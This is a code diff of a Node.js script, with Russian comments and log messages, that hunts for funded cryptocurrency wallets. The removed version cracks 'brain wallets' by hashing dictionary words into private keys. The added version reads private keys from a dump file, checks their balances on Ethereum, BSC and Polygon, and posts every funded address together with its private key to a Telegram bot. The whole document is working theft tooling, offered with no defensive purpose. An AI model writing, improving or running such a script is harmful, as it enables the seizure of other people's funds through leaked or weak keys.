@@ -1,58 +1,81 @@
-const ethers = require("ethers");
-const axios = require("axios");
-const fs = require("fs");
-const crypto = require("crypto");
+const fs = require('fs');
+const axios = require('axios');
+const { ethers } = require('ethers');
+require('dotenv').config();
 
-// ENV
-const botToken = process.env.BOT_TOKEN;
-const chatId = process.env.CHAT_ID;
-const rpcUrl = process.env.RPC_URL;
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const CHAT_ID = process.env.CHAT_ID;
 
-const provider = new ethers.JsonRpcProvider(rpcUrl);
-const minBalance = 0.001; // ETH
+const CHAINS = [
+  {
+    name: 'Ethereum',
+    rpc: process.env.RPC_ETH,
+    symbol: 'ETH',
+  },
+  {
+    name: 'BSC',
+    rpc: process.env.RPC_BSC,
+    symbol: 'BNB',
+  },
+  {
+    name: 'Polygon',
+    rpc: process.env.RPC_POLYGON,
+    symbol: 'MATIC',
+  },
+];
 
-// Словарь
-const words = ["ghost", "hunter", "lost", "wallet", "money", "dark", "light"];
-
-// Telegram уведомление
 async function sendToTelegram(message) {
   try {
-    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      chat_id: chatId,
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    await axios.post(url, {
+      chat_id: CHAT_ID,
       text: message,
     });
   } catch (err) {
-    console.error("Ошибка Telegram:", err.message);
+    console.error('Ошибка Telegram:', err.message);
   }
 }
 
-// Генерация приватного ключа из слова
-function generatePrivateKeyFromWord(word) {
-  return crypto.createHash("sha256").update(word).digest("hex");
-}
+async function checkAddress(privateKey) {
+  let wallet;
+  try {
+    wallet = new ethers.Wallet(privateKey);
+  } catch (e) {
+    return; // некорректный ключ
+  }
 
-// Генерация и проверка адреса
-async function generateAndCheck() {
-  for (const word of words) {
+  for (const chain of CHAINS) {
     try {
-      const privateKey = generatePrivateKeyFromWord(word);
-      const wallet = new ethers.Wallet(privateKey);
-      const address = wallet.address;
-
-      const balance = await provider.getBalance(address);
-      const eth = Number(ethers.formatEther(balance));
-
-      console.log(`Слово: ${word} → ${address} | Баланс: ${eth} ETH`);
-
-      if (eth > minBalance) {
-        await sendToTelegram(`Найдено:\n${address}\nБаланс: ${eth} ETH`);
+      const provider = new ethers.JsonRpcProvider(chain.rpc);
+      const balance = await provider.getBalance(wallet.address);
+      const eth = parseFloat(ethers.formatEther(balance));
+      if (eth > 0) {
+        const msg = `НАЙДЕН АКТИВНЫЙ АДРЕС в ${chain.name}\nАдрес: ${wallet.address}\nБаланс: ${eth} ${chain.symbol}\nКлюч: ${privateKey}`;
+        console.log(msg);
+        await sendToTelegram(msg);
       }
     } catch (err) {
-      console.error(`Ошибка при проверке: ${err.message}`);
+      console.log(`RPC ошибка (${chain.name}):`, err.message);
     }
   }
-
-  console.log("Генерация завершена.");
 }
 
-generateAndCheck();
+async function scanDump(filePath) {
+  const content = fs.readFileSync(filePath, 'utf-8');
+  const lines = content.split('\n');
+
+  for (let i = 0; i < lines.length; i++) {
+    const key = lines[i].trim();
+    if (key.length >= 64 && !key.startsWith('#')) {
+      await checkAddress(key);
+    }
+
+    if ((i + 1) % 50 === 0) {
+      console.log(`Проверено ключей: ${i + 1}`);
+    }
+  }
+}
+
+(async () => {
+  await scanDump('sample_dump.txt');
+})();
